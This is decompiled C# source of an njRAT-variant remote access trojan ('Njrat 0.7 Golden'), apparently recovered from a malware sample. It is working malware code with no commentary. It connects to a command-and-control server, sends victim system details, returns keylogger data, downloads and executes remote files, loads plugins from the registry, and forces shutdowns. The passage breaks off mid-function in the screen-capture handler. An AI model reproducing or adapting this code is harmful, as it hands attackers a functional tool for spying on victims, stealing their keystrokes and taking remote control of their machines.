// Decompiled with JetBrains decompiler
// Type: Stub.OK.j.OK
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F80CF07-A728-4068-AB17-EE2E0D15A383
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-7c321e4c1f7dee37aab2fd65d50987b9502a3700348ef2ab08d79a952ff27ab7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Stub.My;
using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub.OK.j
{
  internal sealed class OK
  {
    public const int SWP_HIDEWINDOW = 128;
    public const int SWP_SHOWWINDOW = 64;
    private static byte[] b = new byte[5121];
    public static bool BD = Conversions.ToBoolean("False");
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static string DR = "UserProfile";
    public static string EXE = "l444oca32lhost.exe";
    public static Computer F = new Computer();
    public static FileStream FS;
    private static string H = "NC50Y3मेubmdyb2suaW8!";
    public static string icn = "#ic";
    public static bool Idr = Conversions.ToBoolean("True");
    public static bool IsF = Conversions.ToBoolean("False");
    public static bool RegistrySt = Conversions.ToBoolean("True");
    private static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    private static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static string P = "粹ताk3NjE=";
    public static string xDlol1 = "Java update";
    public static string Sleep = "False";
    public static string Sleep1 = "1";
    public static object PLG = (object) null;
    public static string RG = "Windows Update4388";
    public static string Task = "False";
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static string Hide = "False";
    public static string HP = "True";
    public static bool SPR = Conversions.ToBoolean("false");
    public static string VN = "SGFjS2VkMg==";
    public static string VR = "Njrat 0.7 Golden By Hassan Amiri";
    public static string Y = "|Hassan|";

    private static void HassanAmiri(object a0) => Stub.OK.j.OK.Ind((byte[]) a0);

    private static void ImHere(object a0, SessionEndingEventArgs a1) => Stub.OK.j.OK.ED();

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = Stub.OK.j.OK.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (Stub.OK.j.OK.GetWindowTextLength((long) foregroundWindow) + 1));
        Stub.OK.j.OK.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = Stub.OK.j.OK.ENB(ref str2);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        str1 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          string str1 = (string) null;
          int wDriver = (int) checked ((short) num);
          string str2 = Strings.Space(100);
          ref string local1 = ref str2;
          ref string local2 = ref str1;
          if (Stub.OK.j.OK.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return false;
    }

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public static bool connect()
    {
      Stub.OK.j.OK.Cn = false;
      Thread.Sleep(2000);
      lock (Stub.OK.j.OK.LO)
      {
        try
        {
          if (Stub.OK.j.OK.C != null)
          {
            try
            {
              Stub.OK.j.OK.C.Close();
              Stub.OK.j.OK.C = (TcpClient) null;
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              Exception ex2 = ex1;
              ProjectData.SetProjectError(ex2);
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            Stub.OK.j.OK.MeM.Dispose();
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            Exception ex4 = ex3;
            ProjectData.SetProjectError(ex4);
            ProjectData.SetProjectError(ex4);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex5)
        {
          ProjectData.SetProjectError(ex5);
          Exception ex6 = ex5;
          ProjectData.SetProjectError(ex6);
          ProjectData.SetProjectError(ex6);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Stub.OK.j.OK.MeM = new MemoryStream();
          Stub.OK.j.OK.C = new TcpClient();
          Stub.OK.j.OK.C.ReceiveBufferSize = 204800;
          Stub.OK.j.OK.C.SendBufferSize = 204800;
          Stub.OK.j.OK.C.Client.SendTimeout = 10000;
          Stub.OK.j.OK.C.Client.ReceiveTimeout = 10000;
          Stub.OK.j.OK.C.Connect(Stub.OK.j.OK.H, Conversions.ToInteger(Stub.OK.j.OK.P));
          Stub.OK.j.OK.Cn = true;
          Stub.OK.j.OK.Send(Stub.OK.j.OK.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.GTV("vn", (object) "")))), (object) "", false))
            {
              str2 = str1 + Stub.OK.j.OK.DEB(ref Stub.OK.j.OK.VN) + "\r\n";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.GTV("vn", (object) "")))));
              string str4 = Stub.OK.j.OK.DEB(ref s);
              str2 = str3 + str4 + "\r\n";
            }
            string s1 = str2 + Stub.OK.j.OK.H + ":" + Stub.OK.j.OK.P + "\r\n" + Stub.OK.j.OK.DR + "\r\n" + Stub.OK.j.OK.EXE + "\r\n" + Conversions.ToString(Stub.OK.j.OK.Idr) + "\r\n" + Conversions.ToString(Stub.OK.j.OK.IsF) + "\r\n" + Conversions.ToString(Stub.OK.j.OK.RegistrySt) + "\r\n" + Conversions.ToString(Stub.OK.j.OK.BD);
            Stub.OK.j.OK.Send("inf" + Stub.OK.j.OK.Y + Stub.OK.j.OK.ENB(ref s1));
          }
          catch (Exception ex7)
          {
            ProjectData.SetProjectError(ex7);
            Exception ex8 = ex7;
            ProjectData.SetProjectError(ex8);
            ProjectData.SetProjectError(ex8);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex9)
        {
          ProjectData.SetProjectError(ex9);
          Exception ex10 = ex9;
          ProjectData.SetProjectError(ex10);
          ProjectData.SetProjectError(ex10);
          Stub.OK.j.OK.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return Stub.OK.j.OK.Cn;
    }

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return Stub.OK.j.OK.BS(ref B);
    }

    public static string GetAntiVirus()
    {
label_0:
      int num1;
      string str;
      int num2;
      try
      {
        int num3 = 1;
        object obj1 = (object) "Select * From AntiVirusProduct";
label_1:
        num3 = 2;
        object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2"));
label_2:
        num3 = 3;
        object Instance = objectValue1;
        object[] objArray = new object[1]
        {
          RuntimeHelpers.GetObjectValue(obj1)
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj2 = NewLateBinding.LateGet(Instance, (System.Type) null, "ExecQuery", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          obj1 = RuntimeHelpers.GetObjectValue(objArray[0]);
        object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
label_5:
        num3 = 4;
        IEnumerator enumerator = ((IEnumerable) objectValue2).GetEnumerator();
        goto label_10;
label_7:
        ProjectData.ClearProjectError();
        num1 = 1;
label_8:
        num3 = 6;
        object objectValue3;
        str = NewLateBinding.LateGet(objectValue3, (System.Type) null, "displayName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null).ToString();
        goto label_20;
label_10:
        if (enumerator.MoveNext())
        {
          objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
          goto label_7;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_13:
        num3 = 8;
        str = "No Antivirus";
        goto label_20;
label_15:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_5;
              case 5:
                goto label_7;
              case 6:
                goto label_8;
              case 7:
                num3 = 7;
                goto label_10;
              case 8:
                goto label_13;
              case 9:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      string antiVirus = str;
      if (num2 == 0)
        return antiVirus;
      ProjectData.ClearProjectError();
      return antiVirus;
    }

    public static void DLV(string n)
    {
      try
      {
        Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + Stub.OK.j.OK.RG, true).DeleteValue(n);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void ED() => Stub.OK.j.OK.pr(0);

    public static string ENB(ref string s) => Convert.ToBase64String(Stub.OK.j.OK.SB(ref s));

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    public static object GTV(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + Stub.OK.j.OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))))))))));
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)));
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }

    public static string HWD()
    {
      string str;
      try
      {
        string lpVolumeNameBuffer = (string) null;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        int lpVolumeSerialNumber;
        Stub.OK.j.OK.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static void SetWallpaper(object Wallpaper)
    {
      Image image;
      switch (Wallpaper)
      {
        case string _:
          image = Image.FromFile(Conversions.ToString(RuntimeHelpers.GetObjectValue(Wallpaper)));
          break;
        case Image _:
          image = (Image) Wallpaper;
          break;
        default:
          return;
      }
      string lpvParam = Interaction.Environ("temp") + "\\CurrentWallpaper.Bmp";
      image.Save(lpvParam, ImageFormat.Bmp);
      Stub.OK.j.OK.SystemParametersInfo(20, 0, ref lpvParam, 3);
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SwapMouseButton(long bSwap);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long mciSendString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Command,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ReturnString,
      long ReturnLength,
      long hWnd);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(Stub.OK.j.OK.BS(ref b), Stub.OK.j.OK.Y);
      try
      {
        string Left1 = strArray1[0];
        string Left2 = Left1;
        if (Operators.CompareString(Left2, "fun", false) == 0)
          Stub.OK.j.OK.Send("fun");
        else if (Operators.CompareString(Left2, "site", false) == 0)
          Stub.OK.j.OK.Send("site");
        else if (Operators.CompareString(Left2, "cwall", false) == 0)
          Stub.OK.j.OK.SetWallpaper((object) strArray1[1]);
        else if (Operators.CompareString(Left2, "Restart", false) == 0)
          Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide);
        else if (Operators.CompareString(Left2, "Shutdown", false) == 0)
          Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide);
        else if (Operators.CompareString(Left2, "ErorrMsg", false) == 0)
        {
          string Left3 = strArray1[1];
          MessageBoxIcon icon;
          if (Operators.CompareString(Left3, "1", false) == 0)
            icon = MessageBoxIcon.Asterisk;
          else if (Operators.CompareString(Left3, "2", false) == 0)
            icon = MessageBoxIcon.Question;
          else if (Operators.CompareString(Left3, "3", false) == 0)
            icon = MessageBoxIcon.Exclamation;
          else if (Operators.CompareString(Left3, "4", false) == 0)
            icon = MessageBoxIcon.Hand;
          string Left4 = strArray1[2];
          MessageBoxButtons buttons;
          if (Operators.CompareString(Left4, "1", false) == 0)
            buttons = MessageBoxButtons.YesNo;
          else if (Operators.CompareString(Left4, "2", false) == 0)
            buttons = MessageBoxButtons.YesNoCancel;
          else if (Operators.CompareString(Left4, "3", false) == 0)
            buttons = MessageBoxButtons.OK;
          else if (Operators.CompareString(Left4, "4", false) == 0)
            buttons = MessageBoxButtons.OKCancel;
          else if (Operators.CompareString(Left4, "5", false) == 0)
            buttons = MessageBoxButtons.RetryCancel;
          else if (Operators.CompareString(Left4, "6", false) == 0)
            buttons = MessageBoxButtons.AbortRetryIgnore;
          int num = (int) MessageBox.Show(strArray1[4], strArray1[3], buttons, icon);
        }
        else if (Operators.CompareString(Left2, "NormalMouse", false) == 0)
          Stub.OK.j.OK.SwapMouseButton(0L);
        else if (Operators.CompareString(Left2, "ReverseMouse", false) == 0)
          Stub.OK.j.OK.SwapMouseButton(256L);
        else if (Operators.CompareString(Left2, "peech", false) == 0)
        {
          object[] objArray = new object[1];
          string[] strArray2 = strArray1;
          int index = 1;
          objArray[0] = (object) strArray2[index];
          object[] Arguments = objArray;
          bool[] CopyBack = new bool[1]{ true };
          NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice")))), (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (CopyBack[0])
            strArray2[index] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (string)));
        }
        else if (Operators.CompareString(Left2, "HideM", false) == 0)
        {
          string str1 = "Shell_traywnd";
          ref string local1 = ref str1;
          string str2 = "";
          ref string local2 = ref str2;
          Stub.OK.j.OK.SetWindowPos(Stub.OK.j.OK.FindWindow(ref local1, ref local2), 0, 0, 0, 0, 0, 128);
        }
        else if (Operators.CompareString(Left2, "ShowM", false) == 0)
        {
          string str3 = "Shell_traywnd";
          ref string local3 = ref str3;
          string str4 = "";
          ref string local4 = ref str4;
          Stub.OK.j.OK.SetWindowPos(Stub.OK.j.OK.FindWindow(ref local3, ref local4), 0, 0, 0, 0, 0, 64);
        }
        else if (Operators.CompareString(Left2, "opencd", false) == 0)
        {
          string str5 = "set cdaudio door open";
          ref string local5 = ref str5;
          string str6 = Conversions.ToString(0);
          ref string local6 = ref str6;
          Stub.OK.j.OK.mciSendString(ref local5, ref local6, 0L, 0L);
        }
        else if (Operators.CompareString(Left2, "closecd", false) == 0)
        {
          string str7 = "set cdaudio door closed";
          ref string local7 = ref str7;
          string str8 = Conversions.ToString(0);
          ref string local8 = ref str8;
          Stub.OK.j.OK.mciSendString(ref local7, ref local8, 0L, 0L);
        }
        else if (Operators.CompareString(Left2, "OpenPage", false) == 0)
          Process.Start(strArray1[1]);
        else if (Operators.CompareString(Left2, "MonitorON", false) == 0)
          Stub.OK.j.OK.SendMessage(-1, 274U, 61808U, -1);
        else if (Operators.CompareString(Left2, "MonitorOFF", false) == 0)
          Stub.OK.j.OK.SendMessage(-1, 274U, 61808U, 2);
        else if (Operators.CompareString(Left2, "Scary1", false) == 0)
          Process.Start("www.upload.ee/image/2298158/koli.swf");
        else if (Operators.CompareString(Left2, "Scary2", false) == 0)
          Process.Start("www.upload.ee/image/2971847/scare4.swf");
        else if (Operators.CompareString(Left2, "Scary3", false) == 0)
        {
          Process.Start("www.upload.ee/image/2299952/facey.swf");
        }
        else
        {
          if (Operators.CompareString(Left2, "ll", false) == 0)
          {
            Stub.OK.j.OK.Cn = false;
            return;
          }
          if (Operators.CompareString(Left2, "kl", false) == 0)
          {
            string y = Stub.OK.j.OK.Y;
            string l = A.GetL();
            string str = Stub.OK.j.OK.ENB(ref l);
            Stub.OK.j.OK.Send("kl" + y + str);
            return;
          }
          if (Operators.CompareString(Left2, "prof", false) == 0)
          {
            string Left5 = strArray1[1];
            if (Operators.CompareString(Left5, "~", false) == 0)
            {
              Stub.OK.j.OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              return;
            }
            if (Operators.CompareString(Left5, "!", false) == 0)
            {
              Stub.OK.j.OK.STV(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              Stub.OK.j.OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y), RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.GTV(strArray1[1], (object) ""))))))))));
              return;
            }
            if (Operators.CompareString(Left5, "@", false) != 0)
              return;
            Stub.OK.j.OK.DLV(strArray1[2]);
            return;
          }
        }
        string str9;
        if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Stub.OK.j.OK.ZIP(memoryStream.ToArray());
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              Exception ex2 = ex1;
              ProjectData.SetProjectError(ex2);
              ProjectData.SetProjectError(ex2);
              Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Execute ERROR");
              Stub.OK.j.OK.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch (Exception ex3)
            {
              ProjectData.SetProjectError(ex3);
              Exception ex4 = ex3;
              ProjectData.SetProjectError(ex4);
              ProjectData.SetProjectError(ex4);
              Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Download ERROR");
              Stub.OK.j.OK.Send("bla");
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
          }
          Stub.OK.j.OK.Send("bla");
          string str10 = str9 + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str10, bytes);
            Process.Start(str10);
            Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Executed As " + new FileInfo(str10).Name);
          }
          catch (Exception ex5)
          {
            ProjectData.SetProjectError(ex5);
            Exception ex6 = ex5;
            ProjectData.SetProjectError(ex6);
            Exception ex7 = ex6;
            ProjectData.SetProjectError(ex7);
            Exception exception = ex7;
            Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Execute ERROR " + exception.Message);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          string Left6 = Left1;
          if (Operators.CompareString(Left6, "inv", false) == 0)
          {
            byte[] numArray = (byte[]) Stub.OK.j.OK.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[3].Length < 10 & numArray.Length == 0)
            {
              Stub.OK.j.OK.Send("pl" + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[3].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y + strArray1[2] + Stub.OK.j.OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Stub.OK.j.OK.ZIP(memoryStream.ToArray());
                Stub.OK.j.OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Stub.OK.j.OK.Send("pl" + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.Plugin(numArray, "A"))))))));
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "h", new object[1]
              {
                (object) Stub.OK.j.OK.H
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "p", new object[1]
              {
                (object) Stub.OK.j.OK.P
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "osk", new object[1]
              {
                (object) strArray1[2]
              }, (string[]) null, (System.Type[]) null);
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !Stub.OK.j.OK.Cn, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)))), (object) true, false))))))))))
                Thread.Sleep(1);
              NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "off", new object[1]
              {
                (object) true
              }, (string[]) null, (System.Type[]) null);
            }
          }
          else if (Operators.CompareString(Left6, "ret", false) == 0)
          {
            byte[] numArray = (byte[]) Stub.OK.j.OK.GTV(strArray1[1], (object) new byte[0]);
            if (strArray1[2].Length < 10 & numArray.Length == 0)
            {
              Stub.OK.j.OK.Send("pl" + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y + Conversions.ToString(1));
            }
            else
            {
              if (strArray1[2].Length > 10)
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                numArray = Stub.OK.j.OK.ZIP(memoryStream.ToArray());
                Stub.OK.j.OK.STV(strArray1[1], (object) numArray, RegistryValueKind.Binary);
              }
              Stub.OK.j.OK.Send("pl" + Stub.OK.j.OK.Y + strArray1[1] + Stub.OK.j.OK.Y + Conversions.ToString(0));
              object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.Plugin(numArray, "A"))))))));
              string[] strArray3 = new string[5]
              {
                "ret",
                Stub.OK.j.OK.Y,
                strArray1[1],
                Stub.OK.j.OK.Y,
                null
              };
              string[] strArray4 = strArray3;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)))));
              string str11 = Stub.OK.j.OK.ENB(ref s);
              strArray4[4] = str11;
              Stub.OK.j.OK.Send(string.Concat(strArray3));
            }
          }
          else if (Operators.CompareString(Left6, "CAP", false) == 0)
          {
            Rectangle targetRect = Screen.PrimaryScreen.Bounds;
